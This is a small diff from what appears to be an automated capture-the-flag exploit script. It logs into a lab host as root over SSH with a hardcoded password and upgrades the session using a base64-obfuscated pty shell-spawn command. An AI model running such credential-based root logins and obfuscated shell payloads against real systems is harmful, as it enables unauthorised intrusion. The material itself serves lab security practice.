@@ -17,7 +17,7 @@ tty = b64d('cHl0aG9uMyAtYyAiaW1wb3J0IHB0eTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKSI=')
 
 try:
 	print("\n[\033[1;31m-\033[1;37m] Trying SSH root...\n")
-	request = ssh(host='10.10.11.213', user='root', password='unCR4ckaBL3Pa$$w0rd1')
+	request = ssh(host='10.10.11.213', user='root', password='unCR4ckaBL3Pa$$w0rd')
 	shell = request.process("/bin/sh")
 	shell.sendline(b"echo 'whoami?'")
 	shell.sendline(b"whoami")
